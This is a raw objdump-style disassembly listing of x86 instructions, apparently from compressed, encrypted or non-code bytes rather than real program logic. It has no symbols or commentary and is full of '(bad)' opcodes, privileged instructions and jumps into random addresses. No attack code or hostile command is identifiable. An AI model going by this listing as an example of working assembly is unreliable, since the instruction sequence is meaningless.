  413c1a:	cli    
  413c1b:	fdivr  DWORD PTR [ecx+0x4f]
  413c1e:	mov    DWORD PTR [edi-0x17],ebx
  413c21:	mov    ah,0x23
  413c23:	xor    ebx,DWORD PTR [edx-0x4d]
  413c26:	dec    ebx
  413c27:	lods   al,BYTE PTR ds:[esi]
  413c28:	or     DWORD PTR [ebx+ebx*4],ebx
  413c2b:	dec    edx
  413c2c:	les    ebx,FWORD PTR [ebp-0x7299a117]
  413c32:	mov    esp,0xa1a86f6b
  413c37:	lahf   
  413c38:	cli    
  413c39:	adc    dh,dh
  413c3b:	sti    
  413c3c:	lods   al,BYTE PTR ds:[esi]
  413c3d:	push   ecx
  413c3e:	cmp    DWORD PTR [edi+0x732af0ef],eax
  413c44:	mov    DWORD PTR [edi],esp
  413c46:	and    BYTE PTR [ebp-0x59],cl
  413c49:	inc    edi
  413c4a:	sbb    BYTE PTR [eax],dh
  413c4c:	sti    
  413c4d:	mov    dh,0xd1
  413c4f:	out    dx,eax
  413c50:	push   esp
  413c51:	ds cmp al,0x73
  413c54:	in     al,0x8c
  413c56:	stc    
  413c57:	(bad)  
  413c58:	jge    0x413caa
  413c5a:	ins    DWORD PTR es:[edi],dx
  413c5b:	out    dx,eax
  413c5c:	push   eax
  413c5d:	dec    esi
  413c5e:	mov    edi,0x3f8a3f7a
  413c63:	sahf   
  413c64:	mov    al,0x78
  413c66:	lea    ecx,[ebx-0x27122df0]
  413c6c:	loope  0x413c0d
  413c6e:	aam    0xf8
  413c70:	push   ds
  413c71:	(bad)  
  413c72:	rol    DWORD PTR [edx],0x22
  413c75:	or     DWORD PTR [edx-0x2a82b4eb],0x35
  413c7c:	adc    DWORD PTR [edx],eax
  413c7e:	xor    bl,BYTE PTR [edi+0x2f]
  413c81:	inc    ebp
  413c82:	pop    ss
  413c83:	into   
  413c84:	arpl   dx,si
  413c86:	mov    ecx,0xe1975e1a
  413c8b:	arpl   WORD PTR [ecx+edi*1+0x4bb8e12a],cx
  413c92:	jl     0x413c8c
  413c94:	push   0xe1a68329
  413c99:	das    
  413c9a:	sbb    ah,BYTE PTR [esp+ebp*8]
  413c9d:	adc    eax,0x9d20bc4
  413ca2:	pop    es
  413ca3:	or     edx,esp
  413ca5:	mov    ecx,0xd5ee1dc9
  413caa:	cmp    BYTE PTR [ebx+ebp*2+0x3f],al
  413cae:	mov    dh,BYTE PTR [esi]
  413cb0:	shr    BYTE PTR [eax],cl
  413cb2:	xor    al,0x0
  413cb4:	into   
  413cb5:	pop    edx
  413cb6:	jl     0x413cb2
  413cb8:	retf   0x219c
  413cbb:	jg     0x413c41
  413cbd:	stos   DWORD PTR es:[edi],eax
  413cbe:	xor    DWORD PTR [ecx],edx
  413cc0:	ror    dh,1
  413cc2:	push   ebx
  413cc3:	fs aam 0xc1
  413cc6:	shl    BYTE PTR [ecx],cl
  413cc8:	adc    esp,DWORD PTR [esi-0x72cf641d]
  413cce:	or     eax,DWORD PTR [ebx]
  413cd0:	xor    eax,esp
  413cd2:	ror    BYTE PTR [eax+0x6e],0x6f
  413cd6:	inc    esp
  413cd7:	lahf   
  413cd8:	cmp    bl,BYTE PTR [edx-0x1f062806]
  413cde:	retf   0xbb4d
  413ce1:	ins    DWORD PTR es:[edi],dx
  413ce2:	push   cs
  413ce3:	scas   eax,DWORD PTR es:[edi]
  413ce4:	xor    ebp,DWORD PTR [edi-0x25fec568]
  413cea:	pop    eax
  413ceb:	xchg   esp,eax
  413cec:	ror    BYTE PTR [edx+0x24550fba],0xb3
  413cf3:	xor    DWORD PTR [eax],esp
  413cf5:	jbe    0x413d56
  413cf7:	(bad)  
  413cf8:	hlt    
  413cf9:	adc    esi,ebp
  413cfb:	rcr    DWORD PTR [esi+0x4a],0x8c
  413cff:	mov    BYTE PTR [ebx],cl
  413d01:	retf   
  413d02:	std    
  413d03:	sbb    al,0x3a
  413d05:	push   eax
  413d06:	loope  0x413d69
  413d08:	push   0x99fc769d
  413d0d:	push   ds
  413d0e:	pop    es
  413d0f:	lods   eax,DWORD PTR ds:[esi]
  413d10:	icebp  
  413d11:	add    ecx,edi
  413d13:	repz ret 0x3979
  413d17:	jle    0x413d1f
  413d19:	into   
  413d1a:	mov    fs,eax
  413d1c:	cmp    ebp,DWORD PTR [ecx-0x638d5ae7]
  413d22:	or     al,0x82
  413d24:	fmul   QWORD PTR [ecx+0x2]
  413d27:	aas    
  413d28:	push   0xffffff90
  413d2a:	icebp  
  413d2b:	jb     0x413d2f
  413d2d:	xchg   edx,eax
  413d2e:	jmp    0x413d1b
  413d30:	jl     0x413cbb
  413d32:	loop   0x413d08
  413d34:	inc    ebp
  413d35:	popf   
  413d36:	or     al,0x7e
  413d38:	mov    ebx,0x8baecc56
  413d3d:	pop    edi
  413d3e:	mov    esi,0x117e1a65
  413d43:	sar    BYTE PTR [esi],cl
  413d45:	pop    ebp
  413d46:	adc    DWORD PTR [edx-0x6eb222c3],ebx
  413d4c:	xor    al,BYTE PTR [eax-0x475c01d1]
  413d52:	gs pop es
  413d54:	and    BYTE PTR [ebx],cl
  413d56:	lea    eax,[edx-0x80d568c]
  413d5c:	cmp    dl,BYTE PTR [ecx+0x7a]
  413d5f:	nop
  413d60:	mov    ah,0xa4
  413d62:	ss inc ebp
  413d64:	cdq    
  413d65:	jge    0x413d34
  413d67:	xchg   esp,eax
  413d68:	push   eax
  413d69:	dec    ecx
  413d6a:	sub    BYTE PTR [esi],0xdf
  413d6d:	aas    
  413d6e:	push   es
  413d6f:	retf   
  413d70:	ror    BYTE PTR [ebx-0x7a],1
  413d73:	ror    DWORD PTR [eax+0x3b],0x77
  413d77:	daa    
  413d78:	or     BYTE PTR [ecx],dh
  413d7a:	sbb    eax,DWORD PTR [esi-0x6b]
  413d7d:	or     BYTE PTR ds:0x314b01a5,0x15
  413d84:	jecxz  0x413d67
  413d86:	js     0x413de3
  413d88:	shl    bh,0x2f
  413d8b:	aas    
  413d8c:	call   0xea3e:0x54c2ea82
  413d93:	xor    ebp,ebx
  413d95:	lods   eax,DWORD PTR ds:[esi]
  413d96:	fucom  st(4)
  413d98:	sbb    eax,0x5fa93f5f
  413d9d:	pop    esi
  413d9e:	and    BYTE PTR [edi+0x36e358e3],bh
  413da4:	in     al,0xf6
  413da6:	pop    esp
  413da7:	(bad)  
  413da8:	cli    
  413da9:	inc    ebx
  413daa:	push   esi
  413dab:	and    ebp,DWORD PTR [ebx+0x4226b548]
  413db1:	mov    ?,WORD PTR [ebx+eax*4]
  413db4:	push   0xffffffc4
  413db6:	ror    BYTE PTR [edi-0x2a50636e],0xfd
  413dbd:	and    ah,BYTE PTR [ebp-0x58]
  413dc0:	iret   
  413dc1:	cld    
  413dc2:	gs inc ebp
  413dc4:	sbb    al,0x53
  413dc6:	int    0xef
  413dc8:	mov    esi,0xf159b5bc
  413dcd:	call   0xe7c4:0xe3087518
  413dd4:	ins    DWORD PTR es:[edi],dx
  413dd5:	mov    ch,0xf9
  413dd7:	push   ds
  413dd8:	sbb    BYTE PTR [eax],dh
  413dda:	ds in  eax,0x60
  413ddd:	xor    dl,0x51
  413de0:	xor    al,0x4b
  413de2:	lock cmp al,0x69
  413de5:	test   al,0x99
  413de7:	push   edx
  413de8:	fadd   QWORD PTR [ebp-0x55b06f07]
  413dee:	aaa    
  413def:	mov    bh,0xe9
  413df1:	je     0x413df0
  413df3:	bound  esp,QWORD PTR [edi+0x2]
  413df6:	mov    ebx,0x5bfcd027
  413dfb:	mov    WORD PTR [ecx+eax*2],es
  413dfe:	jecxz  0x413e0f
  413e00:	retf   0x123a
  413e03:	xor    DWORD PTR [eax],0xa8fb3514
  413e09:	mov    gs,WORD PTR [esi]
  413e0b:	add    edx,DWORD PTR [eax+0x3f]
  413e0e:	aad    0xe7
  413e10:	inc    ebx
  413e11:	js     0x413e51
  413e13:	repz push esi
  413e15:	nop
  413e16:	aaa    
  413e17:	ins    DWORD PTR es:[edi],dx
  413e18:	dec    edx
  413e19:	lods   al,BYTE PTR ds:[esi]
  413e1a:	test   al,0x7b
  413e1c:	xchg   BYTE PTR [ecx],al
  413e1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e1f:	pop    esp
  413e20:	fidiv  WORD PTR [ebx-0x142d91cd]
  413e26:	inc    edx
  413e27:	call   0x72d7:0xb18aa92a
  413e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e2f:	rcl    ah,cl
  413e31:	dec    ecx
  413e32:	xor    al,0x40
  413e34:	shl    BYTE PTR [esi],1
  413e36:	pop    edx
  413e37:	cmp    esi,0x44940454
  413e3d:	xchg   edi,eax
  413e3e:	inc    eax
  413e3f:	xchg   edx,eax
  413e40:	dec    ecx
  413e41:	dec    edi
  413e42:	pop    edx
  413e43:	cmp    edx,DWORD PTR [edx]
  413e45:	dec    edi
  413e46:	int3   
  413e47:	(bad)  
  413e48:	or     bh,ch
  413e4a:	add    eax,0xb32198ee
  413e4f:	retf   0xe327
  413e52:	not    BYTE PTR [edx+0x1f]
  413e55:	mov    ebx,0x5a4b4470
  413e5a:	out    0xa2,al
  413e5c:	xchg   esp,eax
  413e5d:	jge    0x413e1b
  413e5f:	jnp    0x413ebd
  413e61:	xor    eax,0xb8e76b7d
  413e66:	(bad)  
  413e67:	in     eax,0xa9
  413e69:	adc    eax,0x554837b2
  413e6e:	cvtps2pi mm1,QWORD PTR ss:[esi+0x6b]
  413e73:	aad    0x46
  413e75:	outs   dx,DWORD PTR ds:[esi]
  413e76:	int3   
  413e77:	clc    
  413e78:	and    ecx,DWORD PTR cs:[esi+0x29af2ee2]
  413e7f:	frstor [esi+0x1624cf49]
  413e85:	sub    al,0x9b
  413e87:	sub    al,0xc8
  413e89:	push   ebp
  413e8a:	ja     0x413e19
  413e8c:	jae    0x413ebf
  413e8e:	dec    esp
  413e8f:	inc    al
  413e91:	adc    eax,0xa3afe482
  413e96:	xor    eax,0x928df58b
  413e9b:	cmp    edi,esi
  413e9d:	cld    
  413e9e:	inc    ebp
  413e9f:	pushf  
  413ea0:	xlat   BYTE PTR ds:[ebx]
  413ea1:	mov    eax,ds:0xf4470231
  413ea6:	lods   eax,DWORD PTR ds:[esi]
  413ea7:	xchg   ebp,eax
  413ea8:	stos   DWORD PTR es:[edi],eax
  413ea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eaa:	fnstenv [eax+0x4d]
  413ead:	xchg   esp,eax
  413eae:	xchg   ecx,eax
  413eaf:	mov    esi,0xb62d2b68
  413eb4:	retf   
  413eb5:	xor    DWORD PTR [esi-0x6100cede],ebx
  413ebb:	jmp    DWORD PTR [ecx-0x73]
  413ebe:	mov    ebp,0x98632e2c
  413ec3:	daa    
  413ec4:	inc    ebp
  413ec5:	push   ds
  413ec6:	ficomp DWORD PTR [ecx+ecx*4+0x151441e9]
  413ecd:	jno    0x413e57
  413ecf:	call   0xda214e50
  413ed4:	sbb    DWORD PTR [ebx],esp
  413ed6:	js     0x413ea2
  413ed8:	jmp    0xcaa8c90c
  413edd:	sbb    eax,0x6fd62480
  413ee2:	and    eax,0x8253c25c
  413ee7:	jns    0x413f2f
  413ee9:	out    dx,eax
  413eea:	(bad)  
  413eeb:	icebp  
  413eec:	pop    es
  413eed:	xchg   edx,eax
  413eee:	stc    
  413eef:	fcmovnbe st,st(5)
  413ef1:	cmp    DWORD PTR [ebx],esp
  413ef3:	out    0x46,al
  413ef5:	mov    edi,0x35ffb99
  413efa:	cmp    dh,BYTE PTR [eax+0x67535ca7]
  413f00:	aad    0x80
  413f02:	outs   dx,DWORD PTR ds:[esi]
  413f03:	(bad)  
  413f04:	retf   0x31bc
  413f07:	int3   
  413f08:	arpl   ax,si
  413f0a:	cmp    DWORD PTR [esi+0x40],ebp
  413f0d:	call   0x509ffa27
  413f12:	pop    ss
  413f13:	push   edx
  413f14:	xor    BYTE PTR [edx+0x234e303d],ch
  413f1a:	sub    eax,0xd85ca07e
  413f1f:	mov    ds:0xfac98f30,al
  413f24:	(bad)  
  413f25:	jae    0x413ec4
  413f27:	lods   al,BYTE PTR ds:[esi]
  413f28:	ficomp DWORD PTR [edx+0xc]
  413f2b:	mov    cl,0x66
  413f2d:	es (bad) 
  413f2f:	push   ecx
  413f30:	loop   0x413f0c
  413f32:	sbb    al,0x13
  413f34:	shl    BYTE PTR [edi+0x1c73ceb7],0xfe
  413f3b:	mov    esi,0xa9e6fcc1
  413f40:	mov    DWORD PTR [eax],esi
  413f42:	jg     0x413f24
  413f44:	add    cl,BYTE PTR [esi-0x25]
  413f47:	add    esp,DWORD PTR [ecx]
  413f49:	inc    ecx
  413f4a:	ret    0x5dcb
  413f4d:	imul   ebx,DWORD PTR [edx],0x4e
  413f50:	stos   DWORD PTR es:[edi],eax
  413f51:	aaa    
  413f52:	sahf   
  413f53:	ficomp WORD PTR ds:0x2ca0d3a2
  413f59:	inc    ebx
  413f5a:	retf   
  413f5b:	das    
  413f5c:	pop    ss
  413f5d:	sub    BYTE PTR [ecx],cl
  413f5f:	adc    edx,DWORD PTR [ebp+0x27]
  413f62:	sahf   
  413f63:	mov    BYTE PTR cs:[eax-0x5844c27c],cl
  413f6a:	lahf   
  413f6b:	ds (bad) 
  413f6d:	push   ss
  413f6e:	jae    0x413f69
  413f70:	loop   0x413fd4
  413f72:	rol    BYTE PTR [esi],1
  413f74:	cmp    eax,0xc82404e9
  413f79:	or     ch,BYTE PTR [edi-0x741bb9e9]
  413f7f:	pop    ecx
  413f80:	retf   0xa1a8
  413f83:	xchg   edi,eax
  413f84:	mov    ah,0x23
  413f86:	jo     0x413f5e
  413f88:	sub    al,0x9d
  413f8a:	mov    esp,0x7cc9b382
  413f8f:	fucomi st,st(3)
  413f91:	pop    edi
  413f92:	in     al,dx
  413f93:	aaa    
  413f94:	les    ebp,FWORD PTR ds:0x62e00a2
  413f9a:	sbb    dh,BYTE PTR [ebx+ebx*8-0x573bb8ca]
  413fa1:	imul   ebp,DWORD PTR [eax+0x7c],0x1ada26b5
  413fa8:	fnstsw WORD PTR [edx+0x70]
  413fab:	mov    ds:0x7d1b60b4,eax
  413fb0:	into   
  413fb1:	cmp    BYTE PTR [esi+0x14],bl
  413fb4:	clc    
  413fb5:	sub    al,0x12
  413fb7:	add    dh,BYTE PTR [ecx]
  413fb9:	dec    ebp
  413fba:	pushf  
  413fbb:	out    dx,eax
  413fbc:	jmp    0x413ff1
  413fbe:	push   ss
  413fbf:	std    
  413fc0:	adc    BYTE PTR [edx],0x7e
  413fc3:	or     BYTE PTR [esp+ebx*1+0x0],bh
  413fc7:	in     al,0x17
  413fc9:	push   ss
  413fca:	fistp  WORD PTR [ebx+0x75bd6cc]
  413fd0:	mov    bl,0x5f
  413fd2:	aas    
  413fd3:	and    cl,BYTE PTR [eax-0x60]
  413fd6:	mov    ebp,0x6b00bb8b
  413fdb:	call   0x4af1dffc
  413fe0:	inc    esp
  413fe1:	fwait
  413fe2:	inc    edi
  413fe3:	mov    eax,ds:0xe383a61f
  413fe8:	adc    al,0xbb
  413fea:	xchg   ecx,eax
  413feb:	fwait
  413fec:	cs int 0xe3
  413fef:	clc    
  413ff0:	push   0x867a7682
  413ff5:	das    
  413ff6:	dec    esp
  413ff7:	je     0x41402d
  413ff9:	les    ecx,FWORD PTR [edi-0x11]
  413ffc:	xchg   ecx,eax
  413ffd:	push   esp
  413ffe:	ror    eax,cl
  414000:	and    ebp,DWORD PTR [eax]
  414002:	adc    DWORD PTR [ecx+0x4e],ecx
  414005:	or     bl,BYTE PTR [edi-0x764348b0]
  41400b:	sti    
  41400c:	sub    ah,cl
  41400e:	jp     0x413f97
  414010:	sub    ecx,0x31bd9fdf
  414016:	xchg   edx,eax
  414017:	rcl    DWORD PTR [ebp-0x4bbe5a46],0x49
  41401e:	mov    ch,0xf6
  414020:	mov    ch,0x38
  414022:	add    ecx,DWORD PTR ss:[ecx+0x412a1940]
  414029:	test   cl,0xa0
  41402c:	fisub  WORD PTR [ecx+0xd]
  41402f:	jne    0x41403d
  414031:	xchg   edx,eax
  414032:	(bad)  
  414033:	outs   dx,DWORD PTR ds:[esi]
  414034:	mov    ds:0xe0bb0bc9,eax
  414039:	aas    
  41403a:	jns    0x414064
  41403c:	ins    BYTE PTR es:[edi],dx
  41403d:	gs mov eax,0x891e2f66
  414043:	ret    
  414044:	mov    al,ds:0xb2afb160
  414049:	pop    ebx
  41404a:	out    0x4d,al
  41404c:	push   eax
  41404d:	rol    DWORD PTR [ebp+0x2d5e6c8f],1
  414053:	inc    edx
  414054:	dec    eax
  414055:	pop    ecx
  414056:	iret   
  414057:	in     al,0x43
  414059:	fisubr DWORD PTR ds:[ecx-0x21]
  41405e:	fsub   QWORD PTR [ebp+0x4d09fa0f]
  414064:	fimul  DWORD PTR [edi]
  414066:	ins    BYTE PTR es:[edi],dx
  414067:	dec    edx
  414068:	arpl   WORD PTR [ebp+eax*8+0x6],bx
  41406c:	xor    ecx,edx
  41406e:	aaa    
  41406f:	push   0x2fbee332
  414074:	sbb    al,BYTE PTR [ebx+0x17cc9c63]
  41407a:	push   ebx
  41407b:	pusha  
  41407c:	call   0xb8cf3855
  414081:	or     BYTE PTR [edx+edi*1],al
  414084:	cwde   
  414085:	retf   
  414086:	xor    al,0xea
  414088:	repz (bad) 
  41408a:	lods   al,BYTE PTR ds:[esi]
  41408b:	fidiv  WORD PTR [edx+0x4a]
  41408e:	stos   BYTE PTR es:[edi],al
  41408f:	and    BYTE PTR [ecx+0x2e],ch
  414092:	inc    ebp
  414093:	lods   al,BYTE PTR ds:[esi]
  414094:	dec    eax
  414095:	lahf   
  414096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414097:	add    eax,0x98660265
  41409c:	int    0xd6
  41409e:	cli    
  41409f:	mov    ds:0x1bdeb7a1,eax
  4140a4:	scas   eax,DWORD PTR es:[edi]
  4140a5:	add    BYTE PTR [ebp+0x6],bl
  4140a8:	push   esi
  4140a9:	mov    ds:0x32b4c9d3,eax
  4140ae:	add    al,0x6a
  4140b0:	xchg   edx,eax
  4140b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140b2:	mov    eax,0xb97a2442
  4140b7:	adc    BYTE PTR [esi],dl
  4140b9:	ins    DWORD PTR es:[edi],dx
  4140ba:	and    al,0x73
  4140bc:	aam    0xb1
  4140be:	mov    dl,0xd7
  4140c0:	mov    bh,0x35
  4140c2:	sbb    esp,esp
  4140c4:	push   esp
  4140c5:	hlt    
  4140c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140c7:	jne    0x41407a
  4140c9:	addr16 sbb eax,0x886b107f
  4140cf:	mov    al,0xca
  4140d1:	aaa    
  4140d2:	mov    bl,0xc
  4140d4:	(bad)  [edi-0x62]
  4140d7:	xchg   esp,ebp
  4140d9:	jecxz  0x4140d1
  4140db:	in     eax,0xcf
  4140dd:	loope  0x4140fa
  4140df:	je     0x414095
  4140e1:	push   esp
  4140e2:	adc    ch,ah
  4140e4:	out    0xb9,eax
  4140e6:	es xchg esp,eax
  4140e8:	jmp    0xb7bd69cd
  4140ed:	xchg   edx,eax
  4140ee:	or     ebp,DWORD PTR [eax+0x35]
  4140f1:	mov    ch,0x1
  4140f3:	pushf  
  4140f4:	mov    edi,0x4943cd86
  4140f9:	xor    al,0xcf
  4140fb:	sub    al,0xf4
  4140fd:	shr    DWORD PTR [edx],0x56
  414100:	adc    dh,BYTE PTR [edx]
  414102:	ins    DWORD PTR es:[edi],dx
  414103:	sub    DWORD PTR [esi-0x6a25ac52],ebp
  414109:	xor    eax,0x2e444497
  41410e:	js     0x414112
  414110:	mov    ch,0xf0
  414112:	ret    
  414113:	xor    eax,0x2ecb4b8b
  414118:	sub    cl,0xd
  41411b:	fdiv   DWORD PTR [edi-0x1b22b7db]
  414121:	aam    0x34
  414123:	jnp    0x41415e
  414125:	les    ecx,FWORD PTR [eax+eiz*4-0x37df4317]
  41412c:	pop    edi
  41412d:	scas   al,BYTE PTR es:[edi]
  41412e:	loope  0x414163
  414130:	jecxz  0x414130
  414132:	sti    
  414133:	and    eax,DWORD PTR ds:0x4b3b1a6c
  414139:	jl     0x4140d6
  41413b:	(bad)  
  41413c:	mov    dl,0xae
  41413e:	call   0x3ca8448b
  414143:	pusha  
  414144:	lock dec ecx
  414146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414147:	icebp  
  414148:	jmp    0x876b:0xc1495e85
  41414f:	fwait
  414150:	jae    0x414157
  414152:	mov    bh,0x77
  414154:	cmc    
  414155:	xchg   esi,eax
  414156:	sbb    BYTE PTR [ebp+0x51],0x8c
  41415a:	adc    eax,0x66cc6bbe
  41415f:	enter  0xf6c,0x38
  414163:	sbb    esi,DWORD PTR [ebx]
  414165:	imul   eax,DWORD PTR [ecx-0x13e3ebf6],0x2d
  41416c:	sub    BYTE PTR [edx],bl
  41416e:	inc    ecx
  41416f:	jns    0x4141be
  414171:	inc    esi
  414172:	lods   eax,DWORD PTR ds:[esi]
  414173:	pop    ds
  414174:	inc    eax
  414175:	in     eax,dx
  414176:	dec    ebp
  414177:	inc    edi
  414178:	lahf   
  414179:	mov    ebx,0xfe4192f6
  41417e:	adc    ebp,ecx
  414180:	cmp    BYTE PTR [ecx],ch
  414182:	rcl    BYTE PTR [ecx+0x2dc8290d],cl
  414188:	test   DWORD PTR [ebx+0x18],edx
  41418b:	bound  edx,QWORD PTR [eax+eax*1]
  41418e:	add    BYTE PTR [ebx],ch
  414190:	and    eax,0x8ba4d5e5
  414195:	push   esp
  414196:	push   ebp
  414197:	adc    eax,0x84b6fb75
  41419c:	sbb    bl,cl
  41419e:	sbb    eax,0x512dea1e
  4141a3:	pusha  
  4141a4:	add    DWORD PTR [ebp-0x397337bc],esi
  4141aa:	jnp    0x4141ca
  4141ac:	jne    0x4141c4
  4141ae:	or     BYTE PTR [edx-0x9],0xcd
  4141b2:	fsub   st(6),st
  4141b4:	inc    esp
  4141b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141b6:	in     eax,dx
  4141b7:	cmp    eax,0xd6cae374
  4141bc:	aaa    
  4141bd:	mul    DWORD PTR [edi]
  4141bf:	shl    eax,cl
  4141c1:	dec    ecx
  4141c2:	call   0xa9e3:0xb2351db6
  4141c9:	push   esp
  4141ca:	fmul   DWORD PTR [ebp-0x78]
  4141cd:	and    bl,BYTE PTR [ebx]
  4141cf:	(bad)  
  4141d0:	push   es
  4141d1:	inc    edx
  4141d2:	adc    cl,BYTE PTR [edi+0x71]
  4141d5:	jp     0x414236
  4141d7:	jg     0x4141ab
  4141d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141da:	frstor [eax-0x57791636]
  4141e0:	pop    es
  4141e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141e2:	add    dh,BYTE PTR [ebx+edi*2+0x64d0cd88]
  4141e9:	cld    
  4141ea:	jmp    0x414229
  4141ec:	jne    0x4141e6
  4141ee:	push   ds
  4141ef:	loope  0x4141d3
  4141f1:	popa   
  4141f2:	and    al,0x92
  4141f4:	ds ret 
  4141f6:	xor    dh,dh
  4141f8:	xor    eax,0xb8a4ccc3
  4141fd:	sub    al,0x59
  4141ff:	jbe    0x41420c
  414201:	loope  0x4141af
  414203:	push   ss
  414204:	xchg   edi,eax
  414205:	cwde   
  414206:	leave  
  414207:	aad    0x75
  414209:	dec    edx
  41420a:	(bad)  
  41420b:	loopne 0x414232
  41420d:	xchg   esp,eax
  41420e:	loopne 0x4141be
  414210:	pop    ss
  414211:	fwait
  414212:	or     bl,dl
  414214:	into   
  414215:	or     DWORD PTR [edi],ebx
  414217:	inc    eax
  414218:	xchg   ecx,eax
  414219:	lar    ebp,WORD PTR [esp+ebp*1]
  41421d:	sbb    ebp,DWORD PTR [ebx]
  41421f:	call   0xcc4eb714
  414224:	mov    al,0xb
  414226:	stos   BYTE PTR es:[edi],al
  414227:	test   ah,cl
  414229:	mov    ecx,0xce105af6
  41422e:	hlt    
  41422f:	es (bad) 
  414232:	push   esp
  414233:	pop    es
  414234:	mov    dh,BYTE PTR [edx+ecx*4]
  414237:	xor    DWORD PTR [ebx],0x21
  41423a:	push   ss
  41423b:	ss ds scas eax,DWORD PTR es:[edi]
  41423e:	cmp    BYTE PTR [ecx],0x27
  414241:	daa    
  414242:	dec    esi
  414243:	jmp    0x414213
  414245:	dec    edx
  414246:	loope  0x414200
  414248:	lahf   
  414249:	pop    esi
  41424a:	cld    
  41424b:	add    eax,0xa7566025
  414250:	fwait
  414251:	adc    BYTE PTR [edx+0x2760a3c8],al
  414257:	aaa    
  414258:	pop    ecx
  414259:	imul   edi,DWORD PTR [edi+0x67],0x3c
  41425d:	mov    esi,0x79ce77a5
  414262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414263:	cmp    ecx,edx
  414265:	out    0xa2,al
  414267:	int3   
  414268:	sbb    edx,DWORD PTR [esi+0x54]
  41426b:	push   esp
  41426c:	mov    dl,0xd5
  41426e:	(bad)  
  41426f:	cmp    al,0x4
  414271:	sbb    dl,BYTE PTR [ebp+eax*4+0x5a2008cd]
  414278:	mov    ch,0xbd
  41427a:	ins    BYTE PTR es:[edi],dx
  41427b:	or     ebx,0x68
  41427e:	inc    ebx
  41427f:	pusha  
  414280:	or     dl,BYTE PTR [bx+di-0x5e]
  414284:	pop    eax
  414285:	int3   
  414286:	daa    
  414287:	jmp    0x41420d
  414289:	(bad)  
  41428a:	ss clc 
  41428c:	cmc    
  41428d:	lock (bad) 
  41428f:	psrlq  mm3,0x12
  414293:	dec    eax
  414294:	push   esi
  414295:	ret    0xbb34
  414298:	lds    esi,FWORD PTR [esi+edi*1+0x20]
  41429c:	adc    eax,0xc644fba7
  4142a1:	add    ah,BYTE PTR [esi]
  4142a3:	pop    esp
  4142a4:	xchg   esi,eax
  4142a5:	out    dx,eax
  4142a6:	ret    
  4142a7:	jne    0x4142fa
  4142a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142aa:	mov    ch,0x7b
  4142ac:	ja     0x4142e3
  4142ae:	test   eax,0xec8bbae1
  4142b3:	xchg   ebx,eax
  4142b4:	ins    BYTE PTR es:[edi],dx
  4142b5:	jmp    0x414253
  4142b7:	cmp    BYTE PTR [edi-0x76],0x1e
  4142bb:	dec    esp
  4142bc:	xor    BYTE PTR [edx+0x45],cl
  4142bf:	stc    
  4142c0:	and    eax,0xa875b43e
  4142c5:	ds ja  0x4142d2
  4142c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142c9:	sbb    eax,0x92d055e9
  4142ce:	js     0x41434e
  4142d0:	xchg   edi,eax
  4142d1:	mov    edx,DWORD PTR [edi+0x23dffe84]
  4142d7:	loop   0x4142d7
  4142d9:	sbb    BYTE PTR [esi-0x677ab9bc],ch
  4142df:	lds    edx,FWORD PTR [edx-0x61]
  4142e2:	mov    dl,0x8d
  4142e4:	(bad)
  4142e8:	adc    DWORD PTR [ecx],esi
  4142ea:	sar    dl,0xe7
  4142ed:	or     edx,DWORD PTR ds:0xb29e08db
  4142f3:	sub    al,0xf3
  4142f5:	push   eax
  4142f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142f7:	sahf   
  4142f8:	je     0x41434b
  4142fa:	shr    BYTE PTR [ebp-0x2954866c],0xc3
  414301:	pop    ebp
  414302:	mov    esp,0x447f755a
  414307:	outs   dx,BYTE PTR ds:[esi]
  414309:	(bad)  
  41430a:	mov    ecx,0xf3a4f530
  41430f:	sbb    ebp,eax
  414311:	lods   al,BYTE PTR ds:[esi]
  414312:	aas    
  414313:	cwde   
  414314:	push   ecx
  414315:	pop    es
  414316:	sbb    eax,0x52ea70ba
  41431b:	aad    0x6c
  41431d:	nop
  41431e:	cli    
  41431f:	sbb    BYTE PTR [esi],dh
  414321:	mov    dh,BYTE PTR [eax-0x7c]
  414324:	jb     0x414327
  414326:	ins    DWORD PTR es:[edi],dx
  414327:	or     al,0x60
  414329:	mov    dh,0x61
  41432b:	and    ecx,DWORD PTR [ecx+0xe]
  41432e:	push   cs
  41432f:	jg     0x41430e
  414331:	xor    eax,0xecbd4ba8
  414336:	lock adc dl,bh
  414339:	outs   dx,DWORD PTR ds:[esi]
  41433a:	adc    DWORD PTR [ebx],edi
  41433c:	nop
  41433d:	cli    
  41433e:	jmp    0x4142c9
  414340:	loope  0x4142f2
  414342:	scas   al,BYTE PTR es:[edi]
  414343:	cmp    eax,0x9552a944
  414348:	pop    esp
  414349:	dec    ecx
  41434a:	fiadd  WORD PTR [ebx-0x78ee5848]
  414350:	fxch   st(2)
  414352:	cmp    dh,BYTE PTR [eax-0x6b968b3d]
  414358:	pop    esi
  414359:	out    0xc7,al
  41435b:	mov    BYTE PTR [ebp+0x214d26e6],al
  414361:	icebp  
  414362:	mov    ebp,0xc5603bfd
  414367:	ror    DWORD PTR [edx+0x3a],1
  41436a:	stos   BYTE PTR es:[edi],al
  41436b:	aad    0x85
  41436d:	lds    esi,FWORD PTR [esi-0x42]
  414370:	mov    ebx,0x17956efc
  414375:	mov    al,0xe
  414377:	adc    esi,DWORD PTR [ecx+0x33]
  41437a:	cld    
  41437b:	das    
  41437c:	scas   eax,DWORD PTR es:[edi]
  41437d:	mov    ch,0xab
  41437f:	icebp  
  414380:	ins    BYTE PTR es:[edi],dx
  414381:	mov    eax,ds:0x3f13fd74
  414386:	xchg   BYTE PTR [eax+0x65],cl
  414389:	push   0xb6e8526d
  41438e:	mov    esi,0x37f1b1e2
  414393:	mov    dh,0xc7
  414395:	addr16 push eax
  414397:	jbe    0x414372
  414399:	scas   eax,DWORD PTR es:[edi]
